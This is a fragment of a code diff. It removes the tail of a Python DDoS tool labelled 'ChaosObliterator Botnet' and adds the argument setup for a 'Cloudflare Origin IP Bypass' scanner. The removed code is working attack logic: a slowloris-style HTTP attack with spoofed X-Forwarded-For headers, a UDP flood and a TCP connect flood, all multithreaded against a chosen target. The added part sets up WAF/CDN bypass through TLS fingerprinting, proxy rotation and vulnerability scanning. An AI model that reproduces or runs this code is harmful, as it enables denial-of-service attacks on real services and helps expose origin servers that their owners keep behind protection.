-                time.sleep(random.uniform(0.002, 0.015))
-                sock.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
-                time.sleep(random.uniform(0.003, 0.02))
-                sock.send(f"X-Forwarded-For: {self._random_ip()}\r\nX-Chaos-Marker: {random.randint(1000000000000000, 9999999999999999)}\r\n".encode())
-                time.sleep(random.uniform(0.004, 0.025))
-                sock.send(b"Connection: keep-alive\r\n\r\n")
-                self._adjust_jitter((time.time() - start_time) * 1000)
-                with self.lock:
-                    self.success_count["ghostloris"] += 1
-                    self.response_times["ghostloris"].append((time.time() - start_time) * 1000)
-                sock.close()
-                time.sleep(random.uniform(0.001, 0.006) * self.jitter_factor)
-            except:
-                pass
-
-    def _udpchaos(self):
-        """L4: UDP chaos with catastrophic multi-port payloads."""
-        if not self.target_l4:
-            return
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        while time.time() < self.end_time:
-            try:
-                port = random.choice(self.active_ports)
-                payload = self._random_payload(896)
-                sock.sendto(payload, (self.target_l4, port))
-                with self.lock:
-                    self.success_count["udpchaos"] += 1
-                time.sleep(random.uniform(0.00001, 0.0001) * self.jitter_factor)
-            except:
-                pass
-        sock.close()
-
-    def _tcpobliterator(self):
-        """L4: TCP obliterator with relentless multi-port SYN floods."""
-        if not self.target_l4:
-            return
-        while time.time() < self.end_time:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.015)
-                port = random.choice(self.active_ports)
-                sock.connect((self.target_l4, port))
-                sock.send(self._random_payload(224))
-                with self.lock:
-                    self.success_count["tcpobliterator"] += 1
-                sock.close()
-                time.sleep(random.uniform(0.00001, 0.0001) * self.jitter_factor)
-            except:
-                pass
-
-    def start(self):
-        """Unleash the chaos obliterator."""
-        if not self.target_l7 and not self.target_l4:
-            logging.error("At least one target (L7 or L4) required")
-            return
-        logging.info(f"ChaosObliterator strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}")
-        if self.target_l4:
-            threading.Thread(target=self._scan_ports, daemon=True).start()
-            time.sleep(0.3)  # Wait for port scan
-        threads = []
-        method_funcs = {
-            "chaoshttp": self._chaoshttp,
-            "ghostloris": self._ghostloris,
-            "udpchaos": self._udpchaos,
-            "tcpobliterator": self._tcpobliterator
-        }
-        for method in self.methods:
-            if method in method_funcs:
-                for _ in range(self.threads // len(self.methods)):
-                    t = threading.Thread(target=method_funcs[method], daemon=True)
-                    threads.append(t)
-        for t in threads:
-            t.start()
-        for t in threads:
-            t.join()
-        avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
-        logging.info(f"Obliteration complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
-
-def main(target_l7: str, target_l4: str, duration: int, methods: str):
-    methods = methods.split(",")
-    obliterator = ChaosObliterator(target_l7, target_l4, duration, methods=methods)
-    obliterator.start()
+                ports.append(int(part))
+            except ValueError:
+                continue
+    return sorted(list(set(ports)))
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="ChaosObliterator Botnet")
-    parser.add_argument("target_l7", nargs="?", default=None, help="L7 target URL (e.g., http://httpbin.org)")
-    parser.add_argument("target_l4", nargs="?", default=None, help="L4 target IP (e.g., 93.184.216.34)")
-    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
-    parser.add_argument("--methods", type=str, default="chaoshttp,ghostloris,udpchaos,tcpobliterator", help="Comma-separated methods")
+    parser = argparse.ArgumentParser(description="Elite-Level Cloudflare Origin IP Bypass")
+    parser.add_argument("domain", help="Target domain (e.g., example.com)")
+    parser.add_argument("wordlist", help="Path to subdomain wordlist file")
+    parser.add_argument("--ports", help="Comma-separated ports or range (e.g., 80,443 or 1-1000)", default="80,443,8080")
+    parser.add_argument("--tls-fingerprint", action="store_true", help="Enable TLS fingerprinting for WAF/CDN bypass")
+    parser.add_argument("--nuclei", action="store_true", help="Enable Nuclei vulnerability scanning")
+    parser.add_argument("--securitytrails-api", help="SecurityTrails API key for passive DNS", default=None)
+    parser.add_argument("--proxy-file", help="Path to proxy list file (one proxy per line)", default=None)
     args = parser.parse_args()
-    main(args.target_l7, args.target_l4, args.duration, args.methods)
+
+    try:
+        asyncio.run(main(args.domain, args.wordlist, args.ports, args.tls_fingerprint, args.nuclei, args.securitytrails_api, args.proxy_file))
+    except KeyboardInterrupt:
+        print("\nScan dihentikan oleh pengguna")
+        logging.info("Scan interrupted by user")
